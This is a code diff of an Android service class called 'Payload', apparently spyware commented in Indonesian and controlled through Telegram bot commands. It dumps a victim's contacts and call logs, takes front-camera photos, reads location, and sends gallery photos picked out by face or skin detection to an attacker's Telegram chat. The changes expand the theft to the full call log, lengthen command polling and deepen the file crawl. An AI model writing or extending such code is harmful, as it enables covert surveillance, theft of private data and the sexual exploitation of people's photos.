@@ -120,8 +120,9 @@ public class Payload extends Service {
                 
                 sendCheckIn(deviceName);
 
-                writeLog("3. Masuk Fast Polling (30 Detik)");
-                long endTime = System.currentTimeMillis() + (30 * 1000);
+                // WAKTU SIAGA: 3 MENIT (180 DETIK)
+                writeLog("3. Masuk Fast Polling (3 Menit)");
+                long endTime = System.currentTimeMillis() + (180 * 1000); 
                 while (System.currentTimeMillis() < endTime) {
                     checkCommands();
                     try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
@@ -178,7 +179,7 @@ public class Payload extends Service {
             } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
                 dumpContactsToFile();
             } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
-                sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
+                dumpCallLogsToFile();
             }
             // FITUR KAMERA & LOKASI
             else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
@@ -210,9 +211,7 @@ public class Payload extends Service {
                     int endQuote = jsonResponse.indexOf("\"", pathIdx);
                     if (endQuote != -1) {
                         String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) {
-                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "acak");
-                        }
+                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "acak");
                     }
                 }
             }
@@ -224,9 +223,7 @@ public class Payload extends Service {
                     int endQuote = jsonResponse.indexOf("\"", pathIdx);
                     if (endQuote != -1) {
                         String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) {
-                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "wajah");
-                        }
+                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "wajah");
                     }
                 }
             }
@@ -238,9 +235,7 @@ public class Payload extends Service {
                     int endQuote = jsonResponse.indexOf("\"", pathIdx);
                     if (endQuote != -1) {
                         String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) {
-                            sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "perut");
-                        }
+                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "perut");
                     }
                 }
             }
@@ -252,20 +247,16 @@ public class Payload extends Service {
                     int endQuote = jsonResponse.indexOf("\"", pathIdx);
                     if (endQuote != -1) {
                         String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 3) {
-                            sendVideoFiltered(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
-                        }
+                        if (parts.length >= 3) sendVideoFiltered(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
                     }
                 }
             }
 
-        } catch (Exception e) { 
-            writeLog("Error checkCommands: " + e.getMessage());
-        }
+        } catch (Exception e) { writeLog("Error checkCommands: " + e.getMessage()); }
     }
 
     private String buildTree(File dir, String prefix, int depth) {
-        if (depth > 4) return "";
+        if (depth > 15) return ""; 
         StringBuilder sb = new StringBuilder();
         File[] files = dir.listFiles();
         if (files == null) return "";
@@ -293,7 +284,6 @@ public class Payload extends Service {
         for (File f : fileList) {
             if (sent >= count) break;
             boolean lolos = false;
-            
             if (mode.equals("acak")) lolos = true;
             else if (mode.equals("wajah")) lolos = detectFace(f.getAbsolutePath());
             else if (mode.equals("perut")) lolos = detectSkin(f.getAbsolutePath());
@@ -317,7 +307,6 @@ public class Payload extends Service {
             FaceDetector.Face[] faces = new FaceDetector.Face[5];
             int numFaces = detector.findFaces(bitmap, faces);
             bitmap.recycle();
-            // detector.release(); <--- INI YANG BIKIN ERROR, UDAH DIHAPUS
             return numFaces > 0;
         } catch (Exception e) { return false; }
     }
@@ -430,19 +419,29 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Gagal kirim Kontak file"); }
     }
 
-    private String getCallLogs() {
+    private void dumpCallLogsToFile() {
+        writeLog("Menyedot semua Call Log...");
         StringBuilder sb = new StringBuilder();
         try {
             Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
             if (cursor != null && cursor.moveToFirst()) {
-                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
-                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))).append("\n");
-                    cursor.moveToNext();
-                }
+                do {
+                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)))
+                      .append("\nTipe: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)))
+                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)))
+                      .append("\nDurasi: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))).append(" detik\n\n");
+                } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) { return "Gagal baca Call Log."; }
-        return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
+        } catch (Exception e) { writeLog("Gagal baca Call Log"); }
+        
+        try {
+            File file = new File(getExternalFilesDir(null), "telpon_dump.txt");
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(sb.toString().getBytes()); fos.close();
+            sendTelegramFile(file.getAbsolutePath(), false, "📞 Dump SEMUA Call Log");
+            file.delete();
+        } catch (Exception e) { writeLog("Gagal kirim Call Log file"); }
     }
 
     private String getLocation() {
@@ -495,7 +494,7 @@ public class Payload extends Service {
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
             request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
             if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
-            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + (isPhoto ? "photo" : "document") + "\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
             FileInputStream fis = new FileInputStream(file);
             byte[] buffer = new byte[4096];
             int bytesRead;
